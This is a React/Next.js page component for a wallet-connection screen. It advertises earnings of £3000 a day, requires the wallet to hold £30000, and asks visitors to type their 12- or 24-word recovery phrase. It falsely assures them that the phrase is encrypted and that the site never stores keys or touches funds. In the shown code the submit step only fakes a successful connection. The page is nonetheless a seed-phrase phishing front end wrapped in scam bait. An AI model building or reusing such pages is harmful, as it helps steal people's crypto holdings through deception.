"use client";

import { useState } from "react";
import {
  Wallet,
  Shield,
  Zap,
  Calendar,
  Check,
  ChevronDown,
  Copy,
  Eye,
  EyeOff,
  AlertCircle,
  ArrowRight,
  ExternalLink,
} from "lucide-react";
import toast from "react-hot-toast";
import styles from "./wallet.module.css";

export default function WalletConnectPage() {
  const [selectedWallet, setSelectedWallet] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [showSeed, setShowSeed] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);

  const walletOptions = [
    { id: "metamask", label: "MetaMask", icon: "🦊" },
    { id: "trust", label: "Trust Wallet", icon: "🔵" },
    { id: "coinbase", label: "Coinbase", icon: "🟦" },
    { id: "others", label: "Others", icon: "🔗" },
  ];

  const selectedWalletLabel =
    walletOptions.find((w) => w.id === selectedWallet)?.label ||
    "Select Wallet";

  const handleConnect = async (e) => {
    e.preventDefault();

    if (!selectedWallet) {
      toast.error("Please select a wallet provider");
      return;
    }

    if (!seedPhrase || seedPhrase.split(" ").length < 12) {
      toast.error("Please enter a valid recovery phrase (12 or 24 words)");
      return;
    }

    setIsConnecting(true);

    setTimeout(() => {
      toast.success("Wallet connected successfully!");
      setIsConnecting(false);
    }, 2000);
  };

  const handleCopy = () => {
    const dummyAddress = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    navigator.clipboard.writeText(dummyAddress);
    toast.success("Address copied to clipboard");
  };

  return (
    <div className={styles.page}>
      {/* Header Section */}
      <div className={styles.header}>
        <h1 className={styles.title}>Start Earning £3000 Daily</h1>
        <p className={styles.subtitle}>
          Connect your cryptocurrency wallet to unlock daily earning
          opportunities. Ensure your wallet contains at least £30000 to be
          eligible for automatic daily rewards.
        </p>

        {/* Feature Badges */}
        <div className={styles.badges}>
          <div className={`${styles.badge} ${styles.badgeSecure}`}>
            <Shield size={14} />
            Secure Connection
          </div>
          <div className={`${styles.badge} ${styles.badgeInstant}`}>
            <Zap size={14} />
            Instant Setup
          </div>
          <div className={`${styles.badge} ${styles.badgeDaily}`}>
            <Calendar size={14} />
            Daily Rewards
          </div>
        </div>
      </div>

      {/* Main Card */}
      <div className={styles.card}>
        <div className={styles.cardHeader}>
          <div className={styles.cardHeaderIcon}>
            <Wallet size={20} />
          </div>
          <div>
            <h2 className={styles.cardTitle}>Connect Your Wallet</h2>
            <p className={styles.cardSubtitle}>
              Choose your wallet provider and enter your recovery phrase
            </p>
          </div>
        </div>

        <div className={styles.cardBody}>
          <form onSubmit={handleConnect} className={styles.form}>
            {/* Wallet Selection */}
            <div className={styles.field}>
              <label className={styles.label}>Select Wallet Provider</label>
              <div className={styles.dropdownWrapper}>
                <button
                  type="button"
                  onClick={() => setDropdownOpen(!dropdownOpen)}
                  className={styles.dropdownTrigger}
                >
                  <span className={styles.dropdownValue}>
                    {selectedWallet && (
                      <span className={styles.walletIcon}>
                        {
                          walletOptions.find((w) => w.id === selectedWallet)
                            ?.icon
                        }
                      </span>
                    )}
                    <span>{selectedWalletLabel}</span>
                  </span>
                  <ChevronDown
                    size={18}
                    className={`${styles.chevron} ${dropdownOpen ? styles.chevronOpen : ""}`}
                  />
                </button>

                {dropdownOpen && (
                  <div className={styles.dropdownMenu}>
                    {walletOptions.map((wallet) => (
                      <button
                        key={wallet.id}
                        type="button"
                        onClick={() => {
                          setSelectedWallet(wallet.id);
                          setDropdownOpen(false);
                        }}
                        className={styles.dropdownItem}
                      >
                        <span className={styles.walletIcon}>{wallet.icon}</span>
                        {wallet.label}
                        {selectedWallet === wallet.id && (
                          <Check size={16} className={styles.dropdownCheck} />
                        )}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>

            {/* Recovery Phrase */}
            <div className={styles.field}>
              <div className={styles.fieldLabelWrapper}>
                <label className={styles.label}>
                  Recovery Phrase (Seed Phrase)
                </label>
              </div>

              <div className={styles.warningBox}>
                <AlertCircle size={18} className={styles.warningIcon} />
                <span>
                  <strong>Important:</strong> Your recovery phrase is encrypted
                  and securely stored. We never store your private keys or
                  access your funds.
                </span>
              </div>

              <div className={styles.textareaWrapper}>
                <textarea
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  type={showSeed ? "text" : "password"}
                  placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
                  className={styles.textarea}
                />
                <button
                  type="button"
                  onClick={() => setShowSeed(!showSeed)}
                  className={styles.toggleBtn}
                >
                  {showSeed ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>

              <div className={styles.wordCount}>
                <span>
                  {seedPhrase.split(" ").filter((w) => w.length > 0).length}{" "}
                  words
                </span>
                <span
                  className={
                    seedPhrase.split(" ").filter((w) => w.length > 0).length >=
                    12
                      ? styles.valid
                      : styles.invalid
                  }
                >
                  {seedPhrase.split(" ").filter((w) => w.length > 0).length >=
                  12
                    ? "✅ Valid phrase length"
                    : "Needs at least 12 words"}
                </span>
              </div>
            </div>

            {/* Actions */}
            <div className={styles.actions}>
              <button
                type="submit"
                disabled={isConnecting}
                className={styles.primaryBtn}
              >
                {isConnecting ? (
                  <>
                    <span className={styles.spinner} />
                    Connecting...
                  </>
                ) : (
                  <>
                    Activate Wallet
                    <ArrowRight size={18} />
                  </>
                )}
              </button>

              <button type="button" className={styles.secondaryBtn}>
                <ExternalLink size={18} />
                Go to Settings
              </button>
            </div>
          </form>

          {/* Demo Wallet Address */}
          <div className={styles.demoAddress}>
            <div>
              <p className={styles.demoLabel}>Demo Wallet Address</p>
              <p className={styles.demoValue}>
                0x71C7656EC7ab88b098defB751B7401B5f6d8976F
              </p>
            </div>
            <button
              type="button"
              onClick={handleCopy}
              className={styles.copyBtn}
              title="Copy address"
            >
              <Copy size={18} />
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
